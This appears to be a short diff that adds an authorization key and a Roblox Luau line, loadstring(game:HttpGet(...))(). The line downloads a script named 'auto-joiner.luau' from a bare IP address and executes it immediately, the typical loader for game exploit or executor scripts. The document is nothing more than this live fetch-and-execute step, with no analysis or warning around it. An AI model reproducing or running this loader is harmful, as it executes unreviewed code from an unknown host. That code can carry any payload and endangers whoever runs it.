@@ -1,1 +1,2 @@
-
+AUTHORIZATION_KEY="$2b$10$OnKu5TKUnMmDFfl6mFrlXex00KmOqYZxJ0ezzum83W9RJWJ8A/Q2e";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/auto-joiner.luau"))()
